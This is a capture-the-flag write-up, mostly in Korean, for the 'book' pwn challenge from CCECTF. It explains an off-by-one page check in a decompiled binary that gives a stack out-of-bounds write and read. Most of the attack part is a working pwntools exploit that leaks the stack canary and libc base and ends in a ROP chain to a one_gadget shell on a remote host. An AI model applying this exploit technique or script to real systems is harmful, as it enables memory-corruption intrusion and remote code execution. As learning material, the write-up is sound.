# book - CCECTF
## Challenge Info
- Date: 2025
- CTF Name: CCECTF
- Category: pwn
- Difficulty (subjective): easy
- Points: 250
- Provided Files: libc.so.6, prob(ELF)
- tools: gdb(pwndbg), checksec, ROPgadget, one_gadget
## Brief Description
I prepare book for you.
You can write articles in here.
## Initial Analysis
### Environment
``` sh
checksec prob
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
### Code
``` c
undefined8 main(EVP_PKEY_CTX *param_1) {
  long in_FS_OFFSET;
  int menu_var;
  char *buf_page;
  char buf [264];
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  menu_var = -1;
  init(param_1);
  memset(buf,0,0x100);
  do {
    while( true ) {
      while( true ) {
        menu();
        __isoc99_scanf(&%d,&menu_var);
        if (menu_var == 4) {
          if (canary == *(long *)(in_FS_OFFSET + 0x28)) {
            return 0;
          }
                    /* WARNING: Subroutine does not return */
          __stack_chk_fail();
        }
        if (menu_var != 3) break;
        if (added == 0) {
          puts("Write a article first");
        }
        else {
          printf("Page number: ");
          __isoc99_scanf(&%u,&pagenum);
          if (4 < pagenum) { // pagenum = 4가 되면, 256(64*4)위치에서 64byte 더 덮어쓸 수 있음 -> BOF
            puts("[ERROR] Only [0~3] page is available");
                    /* WARNING: Subroutine does not return */
            exit(-1);
          }
          printf("Edit size: ");
          __isoc99_scanf(&%u,&edit_size);
          if (0x40 < edit_size) {
            puts("[ERROR] Too large");
                    /* WARNING: Subroutine does not return */
            exit(-1);
          }
          printf("Write content : ");
          buf_page = buf + (pagenum << 6); // pagenum * 64 = 각 페이지 크기 64byte
          read(0,buf_page,0x40);
        }
      }
      if (menu_var < 4) break;
LAB_0010162b:
      puts("Invalid choice");
    }
    if (menu_var == 1) {
      if (added == 0) {
        printf("Enter article size : ");
        __isoc99_scanf(&%u,&size);
        if (0x100 < size) {
          puts("[ERROR] Too large");
                    /* WARNING: Subroutine does not return */
          exit(-1);
        }
        printf("Write content : ");
        read(0,buf,(ulong)size);
        added = added + 1;
      }
      else {
        puts("article already written");
      }
    }
    else {
      if (menu_var != 2) goto LAB_0010162b;
      if (added == 0) {
        puts("Write a article first");
      }
      else {
        printf("Content: %s\n",buf);
      }
    }
  } while( true );
}
```
``` sh
1. new article
2. view article
3. edit article
4. Exit
```
해당 바이너리는 총 4가지 기능을 제공한다.  
1. 0x100을 넘지않는 선에서 사용자 입력을 `buf`에 저장
2. `buf`를 읽기
3. `buf`를 (의도 상) 4개의 페이지로 구분된 `buf`에서 원하는 페이지에 0x40 만큼 쓰기
4. 종료
## Vulnerability
### OOB(Out of Bounds) - write
``` c
rintf("Page number: ");
__isoc99_scanf(&%u,&pagenum);
if (4 < pagenum) { // pagenum = 4가 되면, 256(64*4)위치에서 64byte 더 덮어쓸 수 있음 -> BOF
  puts("[ERROR] Only [0~3] page is available");
          /* WARNING: Subroutine does not return */
  exit(-1);
}
printf("Edit size: ");
__isoc99_scanf(&%u,&edit_size);
if (0x40 < edit_size) {
  puts("[ERROR] Too large");
          /* WARNING: Subroutine does not return */
  exit(-1);
}
printf("Write content : ");
buf_page = buf + (pagenum << 6); // pagenum * 64 = 각 페이지 크기 64byte
read(0,buf_page,0x40);
```
원래 의도를 유추해보면 최대 3페이지까지 선택이 가능하지만, 코딩 과정에서 실수로 인해서 인지 최대 4페이지까지 작성 가능한 상태다. `buf`의 크기는 264(0x108)인 반면, 4번째 페이지부터 0x40만큼 작성하면 총 0x38 크기 만큼 `buf`의 상위 주소를 덮어쓸 수 있다.  
### OOB(Out of Bounds) - read
``` c
if (menu_var != 2) goto LAB_0010162b;
      if (added == 0) {
        puts("Write a article first");
      }
      else {
        printf("Content: %s\n",buf);
      }
```
1번 기능으로 우선 `buf`를 0x100만큼 채운 후, 첫 번째 `OOB-write` 취약점을 이용하여 canary의 NULL-byte까지 덮어쓰면, canary 및 rbp, ra 등 `buf`보다 상위 주소의 데이터를 읽어올 수 있다.  
## Exploit
### Strategy
Full RELRO가 활성화 되어있어 got를 덮어쓸 수 없다. 따라서 현재 존재하는 `OOB` 취약점을 이용하여 ROP 공격을 시도해야 한다. 그러나 `OOB`로 상위 데이터를 덮어쓸 때, ROP 공격에 유의미하게 활용할 수 있는 최대 크기는 겨우 32(0x20)byte 뿐이므로, `one_gadget`을 활용하면 충분히 공격이 가능해 보인다. 공격 과정은 다음과 같다.  
1. canary leak: `buf`를 다 채운 후, `OOB-write` 취약점을 이용하여 NULL-byte까지 덮어쓰고 `OOB-read` 취약점을 이용하여 카나리 값을 leak 한다.
2. libc_base lead: `libc_start_main`을 이용하여 libc base 주소를 leak한다.
3. one_gadget과 ROPgadget을 이용하여 ROP 공격을 한다.
### Exploitation Steps
``` sh
$ one_gadget ./libc.so.6
0x583ec posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rax == NULL || {"sh", rax, rip+0x17301e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0x583f3 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  address rsp+0x68 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, rip+0x17301e, r12, ...} is a valid argv
  rbx == NULL || (u16)[rbx] == NULL

0xef4ce execve("/bin/sh", rbp-0x50, r12)
constraints:
  address rbp-0x48 is writable
  rbx == NULL || {"/bin/sh", rbx, NULL} is a valid argv
  [r12] == NULL || r12 == NULL || r12 is a valid envp

0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
constraints:
  address rbp-0x50 is writable
  rax == NULL || {"/bin/sh", rax, NULL} is a valid argv
  [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
```
존재하는 one_gadget은 총 4개다.  
### Stack Frame of main
| Variable Name | Offset from RBP |
| --- | --- |
| ra | 0x8 |
| rbp |  |
| canary | -0x8 |
| buf | -0x110 |
| buf_page | -0x118 |
| menu_var | -0x11c |
| sp | -0x140 |
### payload
``` python
from pwn import *

p = remote('15.165.12.135', 12345)
context.arch = "amd64"
e = ELF('./prob')
libc = ELF('./libc.so.6')

# buf size: 0x108

# canary leak
p.sendlineafter(b'> ', b'1') # manu
p.sendlineafter(b'Enter article size : ', b'256') 
payload = b''
payload += b'A' * 0x100
p.sendafter(b'Write content : ', payload)   

p.sendlineafter(b'> ', b'3') # manu
p.sendlineafter(b'Page number: ', b'4')
p.sendlineafter(b'Edit size: ', b'0') 
payload = b''
payload += b'A' * 0x9 # buf(8byte) + canary NULL byte
p.sendafter(b'Write content : ',  payload) 

p.sendlineafter(b'> ', b'2') # manu
p.recvuntil(b'Content: ')
canary = p.recvline()[0x109:0x110]
log.info(f'len = {len(canary)}')
canary = u64(b'\x00' + canary)
log.info(f'canary = {hex(canary)}')

# leak base
p.sendlineafter(b'> ', b'3') # manu
p.sendlineafter(b'Page number: ', b'4')
p.sendlineafter(b'Edit size: ', b'0') 
payload = b''
payload += b'A' * 0x18 # buf canary rbp
p.sendafter(b'Write content : ',  payload) 

p.sendlineafter(b'> ', b'2') # manu
p.recvuntil(b'Content: ')
libc_start_main_xx = p.recvline().strip(b'\n')
# print(libc_start_main_xx)
libc_start_main_xx = libc_start_main_xx[0x118:]
log.info(f'len = {len(libc_start_main_xx)}')
libc_start_main_xx = u64(libc_start_main_xx + b'\x00'*2)
log.info(f'libc_start_main_xx = {hex(libc_start_main_xx)}')
libc_base = libc_start_main_xx - libc.libc_start_main_return
log.info(f'libc_base = {hex(libc_base)}')

# one_gadget
# p.sendlineafter(b'> ', b'3') # manu
# p.sendlineafter(b'Page number: ', b'2')
# p.sendlineafter(b'Edit size: ', b'0')
# payload = b''
# payload = b'A' * 0x17 + b'\x00' + b'A' *0x28
# p.sendafter(b'Write content : ',  payload) 
og = [0xef52b, 0xef4ce, 0x583ec, 0x583f3]
one_gadget = og[2] + libc_base
ret = 0x2882f + libc_base
xor_rax = 0xc75e9 + libc_base
pop_rbx = 0x586e4 + libc_base
rbx_r12_rbp = 0x2a771 + libc_base
payload = b''
payload += b'A' * 0x8 + p64(canary) + b'B' * 0x8 + p64(ret) + p64(xor_rax) + p64(pop_rbx) + p64(0) + p64(one_gadget)
p.sendlineafter(b'> ', b'3') # manu
p.sendlineafter(b'Page number: ', b'4')
p.sendlineafter(b'Edit size: ', b'0') 
p.sendafter(b'Write content : ',  payload) 

# break loof
p.sendlineafter(b'> ', b'4') # manu

# interactive
p.interactive() 
```
